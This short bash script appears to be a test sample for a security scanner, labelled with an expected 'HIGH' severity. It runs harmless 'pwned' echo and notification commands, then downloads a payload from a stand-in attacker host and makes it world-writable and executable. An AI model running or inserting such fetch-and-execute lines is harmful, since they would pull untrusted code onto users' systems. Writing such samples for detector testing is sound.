#!/usr/bin/env bash
# HIGH: bash -c + osascript
bash -c "echo pwned"
osascript -e 'display notification "pwned"'
wget https://evil.example.com/payload -O /tmp/p
chmod 0777 /tmp/p
